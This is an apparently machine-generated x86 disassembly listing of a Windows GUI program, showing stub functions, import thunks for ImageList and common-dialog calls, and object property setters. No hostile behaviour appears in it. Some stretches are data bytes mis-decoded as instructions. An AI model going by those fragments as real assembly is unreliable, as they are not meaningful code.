pop ebx
mov esp ebp
pop ebp
retn
sub_422268
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_42231c
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_42232c
push ebx
mov ebx eax
mov eax ebx
call sub_4224e4
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_422340
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_42235c
push ebx
mov ebx eax
mov eax ebx
call sub_422544
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_4223b8
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_4224c7
jmp sub_403858
sub_4226f8
jmp sub_403858
sub_4226ff
pop ebx
pop ecx
pop ebp
retn
sub_42278b
jmp sub_4035a4
sub_4227eb
jmp sub_403858
sub_4227f2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_422bd3
jmp sub_403858
sub_422bff
jmp sub_403858
sub_422c66
jmp sub_4035a4
sub_422c97
jmp sub_403858
sub_422d1c
jmp sub_4035a4
sub_422d21
mov eax [ ebp - 0x38 ]
call sub_403104
call sub_4038b8
call sub_40390c
sub_422d33
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422d50
mov eax [ ebp - 0x18 ]
call sub_4026dc
retn
sub_422d49
jmp sub_403858
sub_422e9f
jmp sub_4035a4
sub_42316b
jmp sub_4035a4
sub_42324c
mov cl 0x1
call sub_423254
retn
sub_423509
add [ eax ] al
add [ ebx ] dh
leave
call sub_423254
retn
j_sub_4035a4#4
jmp sub_4035a4
sub_423593
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_4038b8
call sub_40390c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4235e4
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_42371d
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_42374c
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_423760
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_423879
jmp sub_4035a4
sub_42392e
jmp sub_4035a4
sub_423998
jmp sub_4035a4
sub_4239cc
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_423958
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_4239e4
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_41dde4
retn
mov [ eax + 0x30 ] edx
retn
sub_4239fc
retn
sub_423a00
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_41dde4
retn
mov [ eax + 0x2c ] edx
retn
sub_423a40
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_41dde4
pop ebp
retn 0x4
sub_423a54
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_41dde4
pop ebp
retn 0x4
sub_423aa9
jmp sub_403858
sub_423ab0
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423c64
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_423c70
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_423d1d
jmp sub_403858
sub_423d24
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_4035a4#3
jmp sub_4035a4
sub_423e7b
jmp sub_403858
sub_423fa9
jmp sub_403858
sub_423fb0
pop ebp
retn
sub_4240e5
jmp sub_403858
sub_4240ec
pop ebp
retn
sub_4240f0
sub [ rw-data ] 0x1
retn
sub_424338
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_413d6c
retn
sub_42436c
mov eax [ eax + 0x4 ]
call sub_413c10
retn
sub_42439d
jmp sub_403858
sub_4243a4
pop ebp
retn
sub_4243a8
sub [ rw-data ] 0x1
retn
ImageList_Create
jmp [ ImageList_Create@IAT ]
ImageList_Destroy
jmp [ __import_lookup_table_12(comctl32:ImageList_Destroy) ]
ImageList_GetImageCount
jmp [ __import_lookup_table_12(comctl32:ImageList_GetImageCount) ]
ImageList_ReplaceIcon
jmp [ ImageList_ReplaceIcon@IAT ]
ImageList_SetBkColor
jmp [ ImageList_SetBkColor@IAT ]
ImageList_GetBkColor
jmp [ ImageList_GetBkColor@IAT ]
ImageList_Replace
jmp [ ImageList_Replace@IAT ]
ImageList_Remove
jmp [ ImageList_Remove@IAT ]
ImageList_BeginDrag
jmp [ __import_lookup_table_12(comctl32:ImageList_BeginDrag) ]
ImageList_EndDrag
jmp [ ImageList_EndDrag@IAT ]
ImageList_DragEnter
jmp [ __import_lookup_table_12(comctl32:ImageList_DragEnter) ]
ImageList_DragLeave
jmp [ ImageList_DragLeave@IAT ]
ImageList_DragMove
jmp [ ImageList_DragMove@IAT ]
ImageList_DragShowNolock
jmp [ __import_lookup_table_12(comctl32:ImageList_DragShowNolock) ]
ImageList_GetDragImage
jmp [ __import_lookup_table_12(comctl32:ImageList_GetDragImage) ]
ImageList_Read
jmp [ __import_lookup_table_12(comctl32:ImageList_Read) ]
ImageList_Write
jmp [ __import_lookup_table_12(comctl32:ImageList_Write) ]
ImageList_GetIconSize
jmp [ __import_lookup_table_12(comctl32:ImageList_GetIconSize) ]
ImageList_SetIconSize
jmp [ __import_lookup_table_12(comctl32:ImageList_SetIconSize) ]
sub_424499
jmp sub_403858
sub_4244a0
pop ebp
retn
sub_4244a4
sub [ rw-data ] 0x1
retn
sub_42456b
jmp sub_403858
sub_424572
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_424b88
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_424594
mov [ rw-data ] sub_4246ac
mov [ rw-data ] sub_42461c
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_4248b0
mov [ rw-data ] sub_424984
mov [ rw-data ] sub_424a58
retn
sub_424c19
jmp sub_403858
sub_424c20
pop ebp
retn
sub_424c24
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_424b88
sub_424c59
jmp sub_403858
sub_424c60
pop ebp
retn
sub_424c64
sub [ rw-data ] 0x1
retn
sub_424ef3
add eax 0xffffffd4
jmp sub_425a20
sub_424efb
add eax 0xffffffd4
jmp sub_425a7c
sub_424f0d
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4055c8
sub_424f17
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4055dc
sub_4250a6
jmp sub_403858
sub_4250ad
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4252bd
jmp sub_403858
sub_4252c4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425479
jmp sub_403858
sub_4254de
jmp sub_403858
sub_4254e5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4255d1
jmp sub_403858
sub_4255d8
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4257e8
lea eax [ ebp - 0x30 ]
call sub_403e54
lea eax [ ebp - 0x20 ]
call sub_403e54
retn
sub_4257f9
jmp sub_403858
j_sub_4257e8
jmp sub_4257e8
sub_425800
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4258fb
jmp sub_403858
sub_425902
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4259ff
jmp sub_403858
sub_425a06
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425a66
lea eax [ ebp - 0x4 ]
call sub_4054f4
retn
sub_425a6f
jmp sub_403858
j_sub_425a66
jmp sub_425a66
sub_425a76
pop ebx
pop ecx
pop ebp
retn
sub_425b11
jmp sub_403858
sub_425b18
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_425b24
mov eax [ eax + 0x20 ]
retn
sub_425c53
jmp sub_403858
sub_425c5a
pop ebp
retn
sub_425c5c
sub [ rw-data ] 0x1
retn
sub_425c89
jmp sub_403858
sub_425c90
pop ebp
retn
sub_425c94
sub [ rw-data ] 0x1
retn
sub_425ccd
jmp sub_403858
sub_425cd4
pop ebp
retn
sub_425cd8
sub [ rw-data ] 0x1
retn
sub_425fe5
jmp sub_403858
sub_425fec
pop ebp
retn
sub_425ff0
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_425d3c
sub_4260d0
retn
sub_426144
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_426150
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_42615c
mov edx [ eax ]
call [ edx ]
retn
sub_426164
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_426191
jmp sub_403858
sub_426198
pop ebp
retn
sub_42619c
sub [ rw-data ] 0x1
retn
sub_42635b
jmp sub_403858
sub_426362
pop ebp
retn
sub_426717
jmp sub_403858
sub_42671e
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_426b38
jmp sub_403858
sub_426b3f
pop ebp
retn
sub_426b44
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4260d4
mov [ rw-data ] eax
sub_426b85
jmp sub_403858
sub_426b8c
pop ebp
retn
sub_426b90
sub [ rw-data ] 0x1
retn
sub_426bbd
jmp sub_403858
sub_426bc4
pop ebp
retn
sub_426bc8
sub [ rw-data ] 0x1
retn
sub_426bf5
jmp sub_403858
sub_426bfc
pop ebp
retn
sub_426c00
sub [ rw-data ] 0x1
retn
sub_426c2d
jmp sub_403858
sub_426c34
pop ebp
retn
sub_426c38
sub [ rw-data ] 0x1
retn
sub_426c65
jmp sub_403858
sub_426c6c
pop ebp
retn
sub_426c70
sub [ rw-data ] 0x1
retn
sub_426c9d
jmp sub_403858
sub_426ca4
pop ebp
retn
sub_426ca8
sub [ rw-data ] 0x1
retn
sub_426d09
jmp sub_403858
sub_426d10
pop ebp
retn
sub_426d14
sub [ rw-data ] 0x1
retn
GetOpenFileNameA
jmp [ __import_lookup_table_13(comdlg32:GetOpenFileNameA) ]
sub_426d49
jmp sub_403858
sub_426d50
pop ebp
retn
sub_426d54
sub [ rw-data ] 0x1
retn
sub_426d81
jmp sub_403858
sub_426d88
pop ebp
retn
sub_426d8c
sub [ rw-data ] 0x1
retn
sub_427230
jmp r-xdata
sub_427232
0x48ffe9ff 0x427a
j_sub_4035a4#2
jmp sub_4035a4
sub_427687
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45a284
call sub_40390c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4276a4
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_4276ac
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_403300
pop esi
retn
sub_4276c4
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_403300
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_4276dc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_427785
jmp sub_403858
sub_4277b3
jmp sub_403858
sub_4277ba
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4277c4
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_4277d8
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_427a70
push ebx
cmp [ eax + 0x8a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_427a90
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_427ab0
push ebx
cmp [ eax + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
sub_427b02
jmp sub_403858
sub_427b09
pop ecx
pop ebp
retn
sub_427e51
jmp sub_403858
sub_427e58
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_427f91
jmp sub_403858
sub_427f98
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_428057
jmp sub_403858
sub_42805e
pop ebx
mov esp ebp
pop ebp
retn
sub_428110
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ eax + 0x64 ]
retn
mov eax [ eax + 0x68 ]
retn
sub_428178
push ebx
mov ebx eax
mov edx GetOpenFileNameA
mov eax ebx
call sub_427ba0
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_428190
push ebx
cmp [ eax + 0xaa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
sub_4283f6
jmp sub_403858
sub_4283fd
pop ebp
retn
sub_428678
pop esp
retn
sub_429047
pop esp
retn
sub_429996
pop esp
retn
sub_429f2c
xor edx edx
mov ecx [ eax + 0x168 ]
mov ecx [ ecx + 0xc ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov eax ecx
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx eax
sub_42a125
jmp sub_403858
sub_42a12c
pop ebx
mov esp ebp
pop ebp
retn
sub_42a238
cmp dl [ eax + 0x179 ]
je r-xdata
retn
mov [ eax + 0x179 ] dl
mov edx eax
call sub_42a2a8
sub_42a250
push esi
mov esi eax
mov eax [ esi + 0x168 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_42a260
cmp dl [ eax + 0x178 ]
je r-xdata
retn
mov [ eax + 0x178 ] dl
mov edx eax
call sub_42a2a8
sub_42a278
cmp dl [ eax + 0x17b ]
je r-xdata
retn
mov [ eax + 0x17b ] dl
mov edx eax
call sub_42a2a8
sub_42a290
cmp dl [ eax + 0x17d ]
je r-xdata
retn
mov [ eax + 0x17d ] dl
mov edx eax
call sub_42a2a8
sub_42a4fa
jmp sub_4035a4
sub_42a5b3
jmp sub_403858
sub_42a5ba
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42a5c0
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_42a534
sub_42a5d0
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_42a534
sub_42a5e0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_42a534
pop ebp
retn 0x8
sub_42a5f8
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_42a724
push ebx
mov ebx eax
mov eax ebx
call sub_440100
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42a738
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42a76c
cmp [ eax + 0x21e ] 0x0
jne r-xdata
retn
mov [ edx + 0xc ] 0x1
sub_42a870
jmp sub_403858
sub_42a877
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42aa1a
jmp sub_403858
sub_42aa21
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42aa2b
inc [ ecx ]
add [ eax ] al
add [ edi ] dl
add [ eax ] al
mov [ eax + 0x220 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42aa40
push ebx
mov ebx eax
mov [ ebx + 0x211 ] dl
mov eax ebx
call sub_43d3e8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42aa78
push ebx
mov ebx eax
mov [ ebx + 0x214 ] edx
mov eax ebx
call sub_43d3e8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42aa94
push ebx
mov ebx eax
mov [ ebx + 0x218 ] edx
mov eax ebx
call sub_43d3e8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42aab0
cmp dl [ eax + 0x21c ]
je r-xdata
retn
mov [ eax + 0x21c ] dl
call sub_43e0c8
sub_42aac4
mov al [ eax + 0x220 ]
retn
sub_42ac2d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
sub_42ac45
jmp sub_403858
sub_42af51
jmp sub_4035a4
sub_42b0c4
retn
sub_42b251
jmp sub_403858
sub_42b2d4
push ebx
mov ebx eax
mov eax ebx
call sub_43c3fc
mov eax ebx
call sub_42b0c8
pop ebx
retn
sub_42b2e8
push ebx
mov ebx eax
mov [ ebx + 0x220 ] 0x1
mov eax ebx
call sub_43cb1c
mov [ ebx + 0x220 ] 0x0
mov eax ebx
call sub_42b410
pop ebx
retn
sub_42b400
push esi
mov esi eax
mov eax [ esi + 0x214 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_42b4d9
jmp sub_403858
sub_42b4e0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42b528
push ebx
mov ebx eax
mov eax ebx
call sub_440084
mov eax ebx
call sub_42b0c8
pop ebx
retn
sub_42b53c
push ebx
mov ebx eax
mov eax ebx
call sub_432cfc
mov eax ebx
call sub_42b0c8
pop ebx
retn
sub_42b550
mov al 0x1
retn
sub_42b554
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_42b88c
jmp sub_403858
sub_42b893
pop ebp
retn
sub_42b898
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403bdc
mov eax [ r-xdata ]
call sub_4135a8
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4135f4
sub_42b8ed
jmp sub_403858
sub_42b8f4
pop ebp
retn
sub_42b8f8
sub [ rw-data ] 0x1
retn
sub_42b931
jmp sub_403858
sub_42b938
pop ebp
retn
sub_42b93c
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_42b9b8
retn
sub_42b9b9
jmp sub_403858
j_sub_42b9b8
jmp sub_42b9b8
sub_42b9c0
pop ebp
retn
sub_42b9c4
sub [ rw-data ] 0x1
retn
sub_42bc20
jmp r-xdata
[ esp + ebx * 8 + 0x42 ]
sub_42bdb9
pop esp
retn
sub_42c40c
mov eax [ eax + 0x4 ]
cmp [ eax + 0x8 ] 0x0
sete al
retn
sub_42cb8f
jmp sub_403858
sub_42cbcb
jmp sub_403858
sub_42d7d6
jmp sub_403858
sub_42d7dd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42da64
call sub_43b87c
retn
sub_42da6c
push ebx
mov ebx eax
mov eax ebx
call sub_42da88
mov edx [ eax ]
call [ edx + 0x24 ]
pop ebx
retn
sub_42da80
mov eax [ r-xdata ]
retn
sub_42da88
mov eax [ eax + 0x16c ]
mov eax [ eax + 0x4 ]
retn
sub_42da94
push esi
mov esi eax
mov eax [ esi + 0x16c ]
call sub_42c57c
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
retn
sub_42daac
mov eax [ eax + 0x16c ]
mov al [ eax + 0x20 ]
retn
sub_42dae4
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42db94
push esi
mov esi eax
cmp dl [ esi + 0x180 ]
je r-xdata
pop esi
retn
mov [ esi + 0x180 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42dbb0
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
call sub_42daec
sub_42dbc4
push esi
mov esi eax
cmp dl [ esi + 0x173 ]
je r-xdata
pop esi
retn
mov [ esi + 0x173 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42dbe0
push esi
mov esi eax
cmp edx [ esi + 0x17c ]
je r-xdata
pop esi
retn
cmp edx 0xffffffff
jl r-xdata
mov [ esi + 0x17c ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42dc00
push esi
mov esi eax
cmp edx [ esi + 0x174 ]
je r-xdata
pop esi
retn
mov [ esi + 0x174 ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42dc58
cmp dl [ eax + 0x172 ]
je r-xdata
retn
mov [ eax + 0x172 ] dl
call sub_42daec
sub_42dc6c
push esi
mov esi eax
mov eax esi
call sub_43ba2c
cmp [ esi + 0x170 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov si 0xffe9
call sub_403300
sub_42ddb9
jmp sub_403858
sub_42ddc0
pop edi
pop esi
pop ecx
pop ebp
retn
sub_42ddc8
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42ddd0
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42ddd8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x16c ]
mov eax esi
call sub_42c508
mov dl [ ebx + 0x182 ]
mov eax esi
call sub_42c61c
pop esi
pop ebx
retn
sub_42e008
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_403104
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_42e0cc
jmp sub_403858
sub_42e0d3
pop ebp
retn
sub_42e1ac
out dx al
[ ecx + ebp * 8 + 0x42 ]
sub_42e6bd
jmp sub_403858
sub_42e76c
push ebx
mov ebx eax
mov eax ebx
call sub_404314
push eax
call GetFileAttributesA
cmp eax 0xffffffff
setne al
pop ebx
retn
j_sub_4035a4#8
jmp sub_4035a4
sub_42e95c
jmp sub_403858
sub_42e963
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42e96c
call sub_4277c4
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45add4
retn
sub_42ea58
jmp sub_403858
sub_42ea5f
pop ebx
mov esp ebp
pop ebp
retn
sub_42ea64
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
xor edx edx
mov [ eax + 0x44 ] edx
test [ eax + 0x5e ] 0x1
jne r-xdata
mov edx r-xdata
mov [ eax + 0x44 ] edx
jmp r-xdata
call sub_428178
retn
sub_42ece2
jmp sub_403858
sub_42ece9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ed06
lea eax [ ebp - 0x8 ]
call sub_403e54
retn
sub_42ecff
jmp sub_403858
sub_42ed06
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42ed42
add [ eax ] al
cmp [ ecx ] 0x1b
jne r-xdata
retn
mov eax edx
call sub_456aec
sub_42ed9f
jmp sub_403858
sub_42eda6
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_42edd1
jmp sub_403858
sub_42edd8
pop ebp
retn
sub_42eddc
sub [ rw-data ] 0x1
retn
sub_42ee38
jmp sub_403858
sub_42ee3f
pop ebp
retn
sub_42ee44
sub [ rw-data ] 0x1
retn
j_sub_403858#9
jmp sub_403858
sub_42eea7
pop ebp
retn
sub_42eeac
sub [ rw-data ] 0x1
retn
j_sub_403858#8
jmp sub_403858
sub_42ef14
pop ebp
retn
sub_42ef18
sub [ rw-data ] 0x1
retn
sub_42ef64
jmp sub_403858
sub_42ef6b
pop ebp
retn
sub_42ef70
sub [ rw-data ] 0x1
retn
j_sub_403858#7
jmp sub_403858
sub_42efa4
pop ebp
retn
sub_42efa8
sub [ rw-data ] 0x1
retn
sub_42f050
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40bd70
mov [ rw-data ] eax
sub_42f085
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_42f09c
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
j_sub_403858#4
jmp sub_403858
sub_42f126
pop ebp
retn
sub_42f128
sub [ rw-data ] 0x1
retn
sub_42f197
jmp [ edi ]
sub_42f438
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_42f450
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_42f494
push ebx
mov ebx eax
mov eax ebx
call sub_42fcf0
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_42fcdf
jmp sub_403858
sub_42fcf0
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_426ac8
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_42f464
sub_42fd47
jmp sub_403858
sub_42fd4e
pop ebp
retn
sub_42fd50
sub [ rw-data ] 0x1
retn
sub_430197
pop esp
retn
sub_430318
jmp [ eax ]
sub_430a18
pop esp
retn
sub_43134e
pop esp
retn
sub_431c49
pop esp
retn
sub_432392
pop esp
retn
sub_4324e8
jmp [ eax ]
sub_432877
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx - 0x4ed5172d ]
add [ eax ] al
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_432c32
jmp sub_403858
sub_432c39
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_432cbe
jmp sub_403858
sub_432cc5
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_432ccc
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_43d3e8
pop ebx
retn
sub_432ce0
push ebx
mov ebx eax
mov eax ebx
call sub_440140
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_43d3e8
pop ebx
retn
sub_432cfc
push ebx
mov ebx eax
mov eax ebx
call sub_43f114
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_432da8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a34c
pop esi
pop ebx
retn
sub_432f12
jmp sub_403858
sub_432f19
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_433028
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_43c3fc
mov eax ebx
mov si 0xffc7
call sub_403300
pop esi
pop ebx
retn
sub_433114
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_433130
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_403300
sub_43314c
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_433158
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_419924
sub_43316c
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4331cc
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_433240
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_403300
pop esi
pop ebx
retn
sub_43325c
push esi
mov esi eax
mov eax esi
call sub_43bf08
mov eax esi
mov si 0xffc7
call sub_403300
pop esi
retn
sub_433301
jmp sub_403858
sub_433308
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_433310
push ebx
mov ebx eax
